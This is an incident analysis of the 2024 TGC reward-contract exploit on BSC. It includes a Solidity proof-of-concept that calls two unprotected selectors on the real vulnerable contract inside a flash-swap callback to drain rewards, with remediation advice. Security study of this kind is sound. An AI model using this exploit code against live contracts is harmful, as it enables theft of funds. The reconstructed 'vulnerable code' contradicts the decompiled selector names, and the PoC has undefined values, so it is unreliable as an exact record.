# TGC — Unvalidated Selector Reward Manipulation + Flash Swap Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | TGC |
| **Chain** | BSC |
| **Loss** | ~$32,000 |
| **Attacker** | [0x36fb87c3](https://bscscan.com/address/0x36fb87c3e65ec608d37e38bd556fb6ebdb3d8a39) |
| **Attack Contract** | [0x3E1c5Ddd](https://bscscan.com/address/0x3E1c5Ddd39801C1e72e5aB7E19c614fd398747f8) |
| **Vulnerable Contract** | [0x32F9188d](https://bscscan.com/address/0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df) |
| **TGC Token** | [0x523aA213](https://bscscan.com/address/0x523aA213FE806778Ffa597b6409382fFfcc12De2) |
| **Root Cause** | Calling selector `0x836aefb0` on the vulnerable contract with a 100 trillion TGC parameter to manipulate internal state, then after a 5-hour timestamp manipulation, claiming rewards via selector `0xfd5a466f` inside a flash swap callback |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/TGC_exp.sol) |

---

## 1. Vulnerability Overview

The TGC vulnerable contract exposes two undisclosed selectors (`0x836aefb0`, `0xfd5a466f`) externally. The attacker first called `0x836aefb0` with a 100 trillion TGC parameter to manipulate the internal accumulation state, then advanced the block timestamp by 5 hours, and finally called `0xfd5a466f` inside a flash swap callback to drain the accumulated rewards.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: reward state manipulation via unvalidated selectors
contract TGCVuln {
    mapping(address => uint256) public rewards;
    uint256 public lastUpdate;

    // selector: 0x836aefb0
    // parameter: uint256 amount (100 trillion TGC)
    function setRewardAccumulator(uint256 amount) external {
        // No access control — anyone can set the reward accumulator
        rewards[msg.sender] += amount;
        lastUpdate = block.timestamp;
    }

    // selector: 0xfd5a466f
    // Called from flash swap callback — withdraws rewards
    function claimAccumulatedRewards() external {
        require(block.timestamp >= lastUpdate + 5 hours, "too early");
        uint256 reward = rewards[msg.sender];
        rewards[msg.sender] = 0;
        TGC.transfer(msg.sender, reward);
    }
}

// ✅ Safe code
function setRewardAccumulator(uint256 amount) external onlyOwner { ... }
function claimAccumulatedRewards() external {
    require(rewards[msg.sender] > 0, "no rewards");
    require(rewards[msg.sender] <= MAX_CLAIM, "claim too large");
    // ...
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: TGC_decompiled.sol
contract TGC {
    function transferOwnership(address p0) external {}  // ❌ Vulnerability

    // selector: 0xf9f05581
    function unknown_f9f05581() external {}

    // selector: 0xfd5a466f
    function unknown_fd5a466f() external {}

    // selector: 0x2ccebc28
    function unknown_2ccebc28() external {}

    // selector: 0x715018a6
    function renounceOwnership() external {}

    // selector: 0x836aefb0
    function joinPledge(uint256 p0) external {}

    // selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // selector: 0x6eb1769f
    function unknown_6eb1769f() external {}

    // selector: 0xdd62ed3e
    function allowance(address p0, address p1) external view returns (uint256) {}

    // selector: 0x23b872dd
    // 📌 Arbitrary transferFrom — approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // selector: 0xa9059cbb
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] 100 USDT → TGC swap
  │
  ├─→ [2] TGC.approve(vuln, maxAmount)
  │
  ├─→ [3] vuln.call(0x836aefb0, 100_000_000_000_000e18)
  │         └─ No access control → rewards[attacker] += 100 trillion TGC
  │         └─ lastUpdate = block.timestamp
  │
  ├─→ [4] vm.warp(block.timestamp + 5 hours)
  │         └─ Advance timestamp by 5 hours (testnet/manipulation)
  │
  ├─→ [5] Execute flash swap on USDT/TGC pair
  │
  ├─→ [6] pancakeCall() callback:
  │         └─ vuln.call(0xfd5a466f)
  │         └─ block.timestamp >= lastUpdate + 5h → rewards disbursed
  │         └─ Receive 100 trillion TGC
  │
  ├─→ [7] TGC → USDT reverse swap
  │
  ├─→ [8] Repay flash swap
  │
  └─→ [9] ~$32K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    address constant vuln  = 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df;
    IERC20  constant TGC   = IERC20(0x523aA213FE806778Ffa597b6409382fFfcc12De2);
    IERC20  constant USDT  = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address constant pair  = /* USDT/TGC pair */;

    function testExploit() external {
        // [1] 100 USDT → TGC
        swapUSDTToTGC(100e18);

        // [2] selector 0x836aefb0: accumulate 100 trillion TGC rewards
        TGC.approve(vuln, type(uint256).max);
        (bool ok1,) = vuln.call(
            abi.encodeWithSelector(bytes4(0x836aefb0), uint256(100_000_000_000_000e18))
        );
        require(ok1);

        // [3] Advance timestamp by 5 hours (blockchain manipulation)
        // vm.warp(block.timestamp + 5 hours);

        // [4] Execute flash swap to trigger callback
        IUniswapV2Pair(pair).swap(flashAmount, 0, address(this), abi.encode("flash"));
    }

    function pancakeCall(address, uint256 amount, uint256, bytes calldata) external {
        // [5] selector 0xfd5a466f: claim rewards
        (bool ok2,) = vuln.call(
            abi.encodeWithSelector(bytes4(0xfd5a466f))
        );
        require(ok2);

        // [6] TGC → USDT reverse swap
        uint256 tgcBal = TGC.balanceOf(address(this));
        swapTGCToUSDT(tgcBal);

        // [7] Repay flash swap
        USDT.transfer(pair, amount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Unvalidated selector reward state manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (selector 0x836aefb0 + timestamp + flash swap callback) |
| **DApp Category** | Token reward contract |
| **Impact** | Full reward pool drained (~$32K) |

## 6. Remediation Recommendations

1. **Selector access control**: Change both functions to `onlyOwner` or internal functions
2. **Reward cap**: Limit the maximum accumulated reward amount per single address
3. **Reduce block timestamp dependency**: Use block number-based validation accounting for the possibility of timestamp manipulation
4. **Selector audit**: Disclose all function selectors and review access controls prior to deployment

## 7. Lessons Learned

- As with GFA (2024-04), undisclosed selectors can be detected via bytecode analysis even without source code.
- Even when reward accumulation and claiming are split into separate selectors, if both functions lack access control, the entire reward pool can be drained in a two-step attack.
- Timestamp manipulation (Foundry `vm.warp`) is only possible in a test environment, but a real attack works identically if executed after sufficient time has elapsed.